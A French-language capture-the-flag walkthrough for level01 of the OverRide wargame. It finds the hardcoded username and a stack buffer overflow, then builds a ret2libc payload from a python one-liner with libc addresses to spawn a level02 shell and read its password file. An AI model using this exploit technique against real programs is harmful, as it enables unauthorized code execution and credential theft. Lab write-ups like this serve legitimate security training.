# Walkthrough ‚Äî Level01 (OverRide)

## üéØ Objectif

Exploiter une vuln√©rabilit√© de type **buffer overflow** dans `level01` pour ex√©cuter `system("/bin/sh")` via un **ret2libc**, et obtenir un shell sous `level02`.

---

## üîç √âtapes d‚Äôanalyse

### 1. Lancement du binaire

```bash
$ ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: coucou
verifying username....
nope, incorrect username...
```

---

### 2. Analyse de `verify_user_name`

Le code assembleur montre une comparaison manuelle entre `a_user_name` et `"dat_wil"` sur 7 caract√®res.

‚úÖ Le bon login est donc :

```
dat_wil
```

---

### 3. Analyse de `verify_user_pass`

La fonction compare le mot de passe avec `"admin"` sur 5 caract√®res mais le `main()` contient :

```c
if ((valid == 0) || (valid != 0)) {
    puts("nope, incorrect password...");
}
```

‚û°Ô∏è M√™me le bon mot de passe est **rejet√© syst√©matiquement**.

---

### 4. Analyse de la faille (overflow)

Dans `main` :

```c
char local_54[64];
fgets(local_54, 100, stdin); // üí• buffer overflow
```

‚û°Ô∏è Le buffer de 64 octets est rempli avec jusqu‚Äô√† 100 octets ‚ûú **d√©bordement de pile**.

---

### 5. Trouver l‚Äôoffset pour √©craser EIP


En entrant 100 caract√®res comme mot de passe, on d√©clenche un crash.

Avec un pattern ou un script, on trouve :

```
./level01
Enter Username: dat_wil
Enter Password: AAAAAAAAAAA... (80 caract√®res)
```

plus rapide :
```

```
Offset = 80
```

---

### 6. Ret2libc ‚Äî Pr√©paration de l‚Äôexploitation

Rechercher les adresses :

#### `/bin/sh`
```gdb
find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
‚Üí 0xf7f897ec
```

#### `system`
```gdb
info function system
‚Üí 0xf7e6aed0
```

#### `exit`
```gdb
info function exit
‚Üí 0xf7e5eb70
```

---

### 7. Construction du payload

Forme du payload :

```
dat_wil\n
[A * 80]
[adresse de system()]
[adresse de exit()]
[adresse de "/bin/sh"]
```

Exemple :

```bash
python3 -c 'print("dat_wil\n" + "A"*80 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7")' > /tmp/payload
```

---

### 8. Exploitation finale

```bash
cat /tmp/payload - | ./level01
$ whoami
level02
$ cat /home/users/level02/.pass
<le mot de passe du level02>
```

---

## ‚úÖ R√©sum√©

| √âl√©ment               | Valeur                      |
|------------------------|-----------------------------|
| Faille                 | Buffer overflow (stack)     |
| Buffer vuln√©rable      | `local_54` (64 octets)      |
| Taille lue             | 100 octets (`fgets`)        |
| Offset EIP             | 80                          |
| Technique              | ret2libc                    |
| Composants             | `system`, `exit`, `"/bin/sh"` |
| √âl√©ment NON vuln√©rable | `a_user_name` (global)      |
